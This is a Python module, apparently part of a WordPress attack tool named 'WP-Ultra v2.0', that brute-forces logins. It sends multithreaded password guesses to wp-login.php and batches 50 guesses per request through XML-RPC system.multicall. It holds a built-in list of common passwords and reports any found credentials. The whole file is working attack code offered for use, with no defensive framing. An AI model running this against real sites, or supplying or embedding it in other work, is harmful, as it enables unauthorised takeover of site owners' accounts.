#!/usr/bin/env python3
"""
WP-Ultra v2.0 — Login Brute Force Module
Author  : Who C29?
Supports wp-login.php and XML-RPC with custom wordlists.
"""

import time
import concurrent.futures
from threading import Lock
from urllib.parse import urljoin

from .utils import (safe_request, print_brute, print_success, print_warning,
                    print_error, print_info, G, Y, R, C, M, W, RESET)

# Built-in common password list (top 60)
BUILTIN_PASSWORDS = [
    "123456","password","123456789","12345678","12345","1234567",
    "1234567890","qwerty","abc123","million2","000000","1234",
    "iloveyou","aaron431","password1","qqww1122","123","omgpop",
    "123321","654321","qwerty123","qwe123","111111","password123",
    "admin123","admin","letmein","welcome","monkey","dragon",
    "master","hello","shadow","sunshine","princess","pass",
    "wordpress","wp2024","wordpress1","admin1234","root","toor",
    "pass123","test","login","ninja","azerty","trustno1",
    "hunter2","baseball","superman","batman","access","696969",
    "mustang","michael","jessica","123abc","football","ranger",
    "shadow","solo","whatever","freedom","summer","harley",
]


class LoginBruter:
    def __init__(self, session, target, headers, timeout, threads=5,
                 wordlist_path=None, delay=0.0):
        self.session       = session
        self.target        = target
        self.headers       = headers
        self.timeout       = timeout
        self.threads       = threads
        self.delay         = delay
        self.xmlrpc_url    = urljoin(target, "/xmlrpc.php")
        self.login_url     = urljoin(target, "/wp-login.php")
        self.passwords     = self._load_wordlist(wordlist_path)
        self._found        = []
        self._stop         = False
        self._lock         = Lock()
        self._done_count   = 0

    # ──────────────────────────────────────────────────────────────────────────
    def _load_wordlist(self, path) -> list:
        if path:
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    return [line.strip() for line in f if line.strip()]
            except Exception as e:
                print_error(f"Could not load wordlist '{path}': {e}")
        return BUILTIN_PASSWORDS

    # ──────────────────────────────────────────────────────────────────────────
    # WP-LOGIN BRUTE FORCE
    # ──────────────────────────────────────────────────────────────────────────
    def brute_wp_login(self, usernames: list) -> list:
        print_info(f"Starting wp-login.php brute force "
                   f"({len(usernames)} user(s) × {len(self.passwords)} passwords, "
                   f"{self.threads} threads)…")

        # Fetch login page once to prime cookies
        safe_request(self.session, self.login_url,
                     headers=self.headers, timeout=self.timeout)

        pairs = [(u, p) for u in usernames for p in self.passwords]
        total = len(pairs)
        self._done_count = 0

        def try_login(pair):
            if self._stop:
                return None
            user, pwd = pair
            data = {
                "log":         user,
                "pwd":         pwd,
                "wp-submit":   "Log In",
                "redirect_to": urljoin(self.target, "/wp-admin/"),
                "testcookie":  "1",
            }
            cookies = {"wordpress_test_cookie": "WP+Cookie+check"}
            r = safe_request(
                self.session, self.login_url, method="POST",
                headers=self.headers, data=data, cookies=cookies,
                timeout=self.timeout, allow_redirects=True,
            )
            with self._lock:
                self._done_count += 1
                if self._done_count % 20 == 0:
                    print_brute(f"Progress: {self._done_count}/{total} attempts…")
            if self.delay:
                time.sleep(self.delay)
            if r and "wp-admin" in r.url and r.status_code == 200:
                return {"user": user, "password": pwd, "method": "wp-login"}
            if r and "dashboard" in r.text.lower() and r.status_code == 200:
                return {"user": user, "password": pwd, "method": "wp-login-dashboard"}
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            for result in ex.map(try_login, pairs):
                if result:
                    self._found.append(result)
                    self._stop = True
                    print_success(f"{G}[CRED FOUND]{RESET} "
                                  f"{result['user']}:{result['password']}")

        return self._found

    # ──────────────────────────────────────────────────────────────────────────
    # XML-RPC BRUTE FORCE (system.multicall — 50 calls per request)
    # ──────────────────────────────────────────────────────────────────────────
    def brute_xmlrpc(self, usernames: list) -> list:
        print_info(f"Starting XML-RPC brute force "
                   f"({len(usernames)} user(s) × {len(self.passwords)} passwords)…")

        found = []
        chunk_size = 50

        for user in usernames:
            if self._stop:
                break
            pairs = [(user, p) for p in self.passwords]
            for i in range(0, len(pairs), chunk_size):
                if self._stop:
                    break
                chunk = pairs[i:i + chunk_size]
                payload = self._build_multicall(chunk)
                r = safe_request(
                    self.session, self.xmlrpc_url, method="POST",
                    headers={**self.headers, "Content-Type": "text/xml"},
                    data=payload, timeout=self.timeout,
                )
                if not r:
                    continue
                segments = r.text.split("<value><struct>")
                for j, seg in enumerate(segments[1:], 0):
                    if "faultCode" not in seg and "blogName" in seg:
                        u, p = chunk[j] if j < len(chunk) else (user, "?")
                        res = {"user": u, "password": p, "method": "xmlrpc-multicall"}
                        found.append(res)
                        self._found.append(res)
                        self._stop = True
                        print_success(f"{G}[CRED FOUND via XML-RPC]{RESET} {u}:{p}")
                if self.delay:
                    time.sleep(self.delay)

        return found

    # ──────────────────────────────────────────────────────────────────────────
    @staticmethod
    def _build_multicall(pairs: list) -> str:
        calls = ""
        for user, pwd in pairs:
            calls += f"""
    <value><struct>
      <member><name>methodName</name>
        <value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>{user}</string></value>
        <value><string>{pwd}</string></value>
      </data></array></value></member>
    </struct></value>"""
        return f"""<?xml version="1.0"?><methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>{calls}
  </data></array></value></param></params>
</methodCall>"""
